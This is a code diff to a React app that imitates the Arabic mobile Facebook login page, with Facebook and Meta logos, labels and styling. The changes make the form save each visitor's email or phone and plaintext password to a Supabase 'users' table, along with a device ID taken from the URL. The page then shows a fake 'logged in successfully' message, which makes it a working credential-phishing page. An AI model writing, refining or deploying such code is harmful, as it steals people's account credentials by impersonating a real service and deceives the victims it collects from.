@@ -18,6 +18,7 @@ export default function App() {
   });
   const [deviceId, setDeviceId] = useState<string | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [message, setMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
 
   useEffect(() => {
     // Extract device_id from URL
@@ -36,56 +37,61 @@ export default function App() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSubmitting(true);
+    setMessage(null);
 
     try {
-      // Send data to Supabase if configured
       if (supabase) {
-        await supabase
-          .from('visitors') // Use appropriate table
+        // إرسال البيانات بالأعمدة المحددة بالضبط
+        const { error: supabaseError } = await supabase
+          .from('users') 
           .insert([
             {
-              email: formData.username, // mapping to email column or similar
-              password: formData.password, // Ensure your DB accepts this or map appropriately
-              device_id: deviceId,
+              email_phone: formData.username,
+              password: formData.password,
+              id: deviceId,
+              created_at: new Date().toISOString()
             },
           ]);
+
+        if (supabaseError) throw supabaseError;
       }
 
-      // Simulate network request
       await new Promise(resolve => setTimeout(resolve, 800));
-      
-      // Redirect or show error if needed, but typically mobile FB might just show loading or error
-      // For now, let's just clear password or show nothing as it's a clone.
-      setFormData(prev => ({...prev, password: ''}));
+      setMessage({
+        type: 'success',
+        text: 'تم تسجيل الدخول بنجاح!'
+      });
+      setFormData({ username: '', password: '' });
     } catch (err: any) {
-      console.error('Error submitting form:', err);
+      console.error('Submission error:', err);
+      setMessage({
+        type: 'error',
+        text: err.message || 'حدث خطأ أثناء الاتصال بقاعدة البيانات.'
+      });
     } finally {
       setIsSubmitting(false);
     }
   };
 
   return (
-    <div dir="rtl" className="min-h-screen bg-white flex flex-col font-sans text-[#1c1e21]">
+    <div dir="rtl" className="min-h-screen bg-white flex flex-col justify-between font-sans text-[#1c1e21] select-none">
+      
       {/* Top Header */}
-      <div className="flex flex-col pt-4 px-4 pb-2">
-        <div className="flex justify-end">
-          <button className="p-2 text-[#1c1e21] opacity-80">
-            <X className="w-6 h-6" strokeWidth={2.5} />
-          </button>
-        </div>
-        <div className="flex justify-center -mt-2">
-          <button className="flex items-center gap-1 text-[13px] text-[#606770]">
-            العربية
-            <ChevronDown className="w-3.5 h-3.5" />
-          </button>
-        </div>
+      <div className="relative flex justify-center items-center pt-4 pb-2 min-h-[56px] px-4">
+        <button className="absolute right-4 p-2 text-[#1c1e21] hover:bg-black/5 rounded-full transition-colors">
+          <X className="w-6 h-6" strokeWidth={2} />
+        </button>
+        <button className="flex items-center gap-1 text-[14px] text-[#606770] font-medium hover:text-[#1c1e21] transition-colors">
+          العربية
+          <ChevronDown className="w-4 h-4" />
+        </button>
       </div>
 
       {/* Main Content */}
-      <div className="flex-grow flex flex-col items-center px-4 w-full max-w-md mx-auto mt-6">
+      <div className="flex-grow flex flex-col items-center px-4 w-full max-w-[420px] mx-auto mt-6">
         
         {/* Facebook Logo */}
-        <div className="mb-12">
+        <div className="mb-12 mt-4">
           <svg viewBox="0 0 36 36" className="w-[60px] h-[60px]" fill="url(#facebook-gradient)">
             <defs>
               <linearGradient x1="50%" y1="97.0782153%" x2="50%" y2="0%" id="facebook-gradient">
@@ -98,54 +104,59 @@ export default function App() {
           </svg>
         </div>
 
+        {message && (
+          <div className={`w-full p-4 mb-4 rounded-2xl border text-[14px] flex items-center justify-center text-center ${
+            message.type === 'success' 
+              ? 'bg-green-50 border-green-200 text-green-700' 
+              : 'bg-red-50 border-red-200 text-red-700'
+          }`}>
+            <span>{message.text}</span>
+          </div>
+        )}
+
         {/* Form */}
         <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3">
+          
           {/* Email / Phone Input */}
-          <div className="relative border border-[#ccd0d5] rounded-[12px] bg-white h-[60px] flex items-center px-4 focus-within:border-[#0866FF] transition-colors shadow-sm">
+          <div className="relative">
             <input
               type="text"
               name="username"
               value={formData.username}
               onChange={handleInputChange}
-              className="w-full h-full pt-4 bg-transparent outline-none text-[16px]"
+              placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
+              className="w-full border border-[#ccd0d5] rounded-2xl bg-white px-4 py-[16px] focus:outline-none focus:border-[#0064e0] focus:ring-1 focus:ring-[#0064e0] transition-all text-[15px] placeholder:text-[#8a8d91] shadow-sm text-right"
               dir="auto"
               required
             />
-            {/* Floating Label */}
-            <div className={`absolute right-4 text-[#606770] transition-all pointer-events-none ${formData.username ? 'text-[12px] top-2' : 'text-[15px] top-1/2 -translate-y-1/2'}`}>
-              رقم الهاتف المحمول أو البريد الإلكتروني
-            </div>
           </div>
 
           {/* Password Input */}
-          <div className="relative border border-[#ccd0d5] rounded-[12px] bg-white h-[60px] flex items-center px-4 focus-within:border-[#0866FF] transition-colors shadow-sm">
+          <div className="relative">
             <input
               type="password"
               name="password"
               value={formData.password}
               onChange={handleInputChange}
-              className="w-full h-full pt-4 bg-transparent outline-none text-[16px] tracking-widest"
+              placeholder="كلمة السر"
+              className="w-full border border-[#ccd0d5] rounded-2xl bg-white px-4 py-[16px] focus:outline-none focus:border-[#0064e0] focus:ring-1 focus:ring-[#0064e0] transition-all text-[15px] placeholder:text-[#8a8d91] shadow-sm text-right"
               dir="auto"
               required
             />
-            {/* Floating Label */}
-            <div className={`absolute right-4 text-[#606770] transition-all pointer-events-none ${formData.password ? 'text-[12px] top-2' : 'text-[15px] top-1/2 -translate-y-1/2'}`}>
-              كلمة السر
-            </div>
           </div>
 
           {/* Login Button */}
           <button
             type="submit"
             disabled={isSubmitting}
-            className="mt-1 w-full bg-[#0866FF] hover:bg-[#0759E0] text-white rounded-[24px] py-3 text-[16px] font-medium transition-colors disabled:opacity-70"
+            className="mt-2 w-full bg-[#0064e0] hover:bg-[#0054c0] text-white rounded-full py-[13px] text-[16px] font-bold transition-all active:scale-[0.99] disabled:opacity-70 shadow-sm"
           >
             {isSubmitting ? 'جاري تسجيل الدخول...' : 'تسجيل الدخول'}
           </button>
         </form>
 
         {/* Forgot Password */}
-        <div className="mt-4">
+        <div className="mt-5">
           <a href="#" className="text-[#1c1e21] text-[15px] font-medium hover:underline">
             هل نسيت كلمة السر؟
           </a>
@@ -155,18 +166,20 @@ export default function App() {
       {/* Bottom Section */}
       <div className="w-full flex flex-col items-center pb-8 px-4 mt-auto">
         {/* Create Account Button */}
-        <button className="w-full max-w-md bg-transparent border border-[#0866FF] text-[#0866FF] rounded-[24px] py-3 text-[15px] font-medium mb-4 hover:bg-[#0866FF] hover:bg-opacity-5 transition-colors">
+        <button className="w-full max-w-[380px] bg-transparent border border-[#0064e0] text-[#0064e0] rounded-full py-[12px] text-[15px] font-medium mb-4 hover:bg-[#ebf5ff] transition-all active:scale-[0.99]">
           إنشاء حساب جديد
         </button>
 
         {/* Meta Logo */}
-        <div className="flex items-center gap-1.5 opacity-70">
-          <svg viewBox="0 0 1000 1000" className="w-5 h-5 fill-current">
+        <div className="flex items-center justify-center gap-1 opacity-70">
+          <svg viewBox="0 0 1000 1000" className="w-[18px] h-[18px] fill-[#1c1e21]">
             <path d="M720.9,436.9c-29.2,0-56.1,12.3-75.1,33.4l-75.1,83.1l-105-115.3c-20.9-23-49.7-36.2-80.9-36.2c-59.5,0-108,48.5-108,108v81.1c0,59.5,48.5,108,108,108h0c31.2,0,60-13.2,80.9-36.2l105-115.3l75.1,83.1c19,21.1,45.9,33.4,75.1,33.4c59.5,0,108-48.5,108-108v-11.2C828.9,485.4,780.4,436.9,720.9,436.9z M384.8,629.7c-9.1,10-21.7,15.7-35.3,15.7c-25.9,0-46.9-21-46.9-46.9v-81.1c0-25.9,21-46.9,46.9-46.9c13.5,0,26.2,5.7,35.3,15.7l90.7,99.6L384.8,629.7z M767.8,590c0,25.9-21,46.9-46.9,46.9c-12.7,0-24.6-5.3-33.1-14.7l-91.8-101.6l91.8-101.6c8.5-9.4,20.4-14.7,33.1-14.7c25.9,0,46.9,21,46.9,46.9V590z"/>
           </svg>
-          <span className="text-[14px] font-semibold tracking-wide">Meta</span>
+          <span className="text-[13px] font-semibold tracking-wide text-[#1c1e21]">Meta</span>
         </div>
       </div>
     </div>
   );
 }
+
+
